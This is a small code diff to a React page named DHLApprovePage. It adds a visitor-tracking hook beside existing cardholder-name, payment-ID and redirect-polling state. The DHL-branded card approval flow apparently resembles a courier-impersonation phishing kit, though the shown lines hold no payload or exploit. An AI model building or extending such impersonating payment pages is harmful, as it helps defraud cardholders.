@@ -3,6 +3,7 @@ import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/com
 import { Building2, Smartphone, CheckCircle2 } from "lucide-react";
 import { useRedirectPolling } from "@/hooks/use-redirect-polling";
 import { useLanguage } from "@/hooks/use-language";
+import { useVisitorTracking } from "@/hooks/use-visitor-tracking";
 
 export default function DHLApprovePage() {
   const { t } = useLanguage();
@@ -12,6 +13,12 @@ export default function DHLApprovePage() {
   const [cardholderName, setCardholderName] = useState("");
   const [sessionId, setSessionId] = useState<string | null>(null);
   const [paymentId, setPaymentId] = useState<string>("");
+
+  // Track visitor
+  useVisitorTracking({
+    sessionId: sessionId || undefined,
+    page: "/approve",
+  });
 
 
   // Get card logo based on bank name
